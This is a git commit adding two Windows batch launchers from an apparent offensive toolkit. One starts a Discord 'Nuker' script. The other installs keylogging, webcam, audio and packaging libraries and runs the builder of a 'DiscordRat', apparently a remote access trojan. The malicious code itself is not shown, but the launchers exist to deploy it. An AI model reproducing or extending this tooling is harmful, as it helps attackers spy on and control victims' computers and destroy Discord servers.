181d0cb7e2cd292155e53abc7b9a53f9505292a0
pywine <ggpywine@gmail.com>
2024-09-12 14:21:28 +0200

    Add files via upload

---
+++ pywine/bat/Nuker.bat
@@ -0,0 +1,7 @@
+@echo off
+pip install requests
+cd ../
+cd Nuker
+cls
+start py DiscordN.py
+exit
---
+++ pywine/bat/RatDiscord.bat
@@ -0,0 +1,22 @@
+@echo off
+cd ../
+cd DiscordRat
+pip install discord.py pycaw comtypes pillow opencv-python psutil requests keyboard asyncio pyinstaller
+cls
+start py builder.py
+
+cls
+
+echo ###########################################
+echo #            Softwere Termited.           #
+echo #                                         #
+echo #                                         #
+echo #                                         #
+echo #                                         #
+echo #                                         #
+echo #                                         #
+echo #                                         #
+echo #           "We Are Sorry :("             #
+echo #                                         #
+echo ###########################################
+exit
